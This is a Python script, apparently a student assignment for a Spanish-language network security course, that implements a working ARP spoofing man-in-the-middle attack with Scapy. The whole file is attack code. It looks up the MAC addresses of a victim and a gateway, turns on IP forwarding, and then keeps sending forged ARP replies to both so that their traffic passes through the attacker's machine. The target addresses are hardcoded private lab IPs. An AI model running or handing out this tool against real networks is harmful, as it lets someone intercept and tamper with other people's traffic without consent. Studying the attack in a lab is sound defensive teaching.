#!/usr/bin/env python3
# =============================================================
# Script   : ARP MitM Attack
# Autor    : Yeury Lopez
# Matricula: 2025-0780
# Materia  : Seguridad de Redes
# =============================================================

from scapy.all import *
import time
import os
import sys

# -------------------------------------------------------------
# FUNCIÓN: Obtener MAC de una IP
# -------------------------------------------------------------
def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast   = Ether(dst="ff:ff:ff:ff:ff:ff")
    paquete     = broadcast / arp_request
    respuesta   = srp(paquete, timeout=2, verbose=False)[0]

    if respuesta:
        return respuesta[0][1].hwsrc
    else:
        print(f"[!] No se pudo obtener MAC de {ip}")
        sys.exit(1)

# -------------------------------------------------------------
# FUNCIÓN: Enviar ARP falso
# -------------------------------------------------------------
def spoof_arp(target_ip, target_mac, spoof_ip):
    # Le dice a target_ip que la MAC de spoof_ip somos nosotros
    paquete = ARP(
        op=2,                # op=2 es ARP Reply
        pdst=target_ip,      # IP destino (víctima)
        hwdst=target_mac,    # MAC destino (víctima)
        psrc=spoof_ip        # IP que estamos suplantando
    )
    send(paquete, verbose=False)

# -------------------------------------------------------------
# FUNCIÓN: Habilitar IP Forwarding
# -------------------------------------------------------------
def enable_forwarding():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[*] IP Forwarding habilitado")

# -------------------------------------------------------------
# FUNCIÓN PRINCIPAL: Ejecutar el ataque
# -------------------------------------------------------------
def arp_mitm(victim_ip, gateway_ip):

    print("=" * 55)
    print("   ARP MitM ATTACK")
    print("   Autor    : Yeury Lopez")
    print("   Matricula: 2025-0780")
    print("=" * 55)

    # Obtener MACs reales
    print(f"\n[*] Obteniendo MAC de víctima  ({victim_ip})...")
    victim_mac  = get_mac(victim_ip)
    print(f"[✓] MAC Víctima  : {victim_mac}")

    print(f"[*] Obteniendo MAC de gateway ({gateway_ip})...")
    gateway_mac = get_mac(gateway_ip)
    print(f"[✓] MAC Gateway  : {gateway_mac}")

    # Habilitar reenvío de paquetes
    enable_forwarding()

    print(f"\n[*] Iniciando ataque...")
    print(f"[*] Inicio : {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[!] Presiona CTRL+C para detener")
    print("-" * 55)

    paquetes = 0

    try:
        while True:
            # Engañar a la víctima: "Yo soy el gateway"
            spoof_arp(victim_ip, victim_mac, gateway_ip)

            # Engañar al gateway: "Yo soy la víctima"
            spoof_arp(gateway_ip, gateway_mac, victim_ip)

            paquetes += 2

            if paquetes % 10 == 0:
                print(f"[+] Paquetes ARP falsos enviados: {paquetes} "
                      f"| {time.strftime('%H:%M:%S')}")

            # Enviar cada 2 segundos
            time.sleep(2)

    except KeyboardInterrupt:
        print(f"\n[!] Ataque detenido por el usuario")
        print(f"[✓] Total paquetes enviados: {paquetes}")
        print("=" * 55)

# -------------------------------------------------------------
# PUNTO DE ENTRADA
# -------------------------------------------------------------
if __name__ == "__main__":

    if os.getuid() != 0:
        print("[!] ERROR: Ejecuta como root (sudo)")
        sys.exit(1)

    # IPs de tu topología
    VICTIM_IP  = "172.25.78.20"   # PC1
    GATEWAY_IP = "172.25.78.1"    # R1

    arp_mitm(VICTIM_IP, GATEWAY_IP)
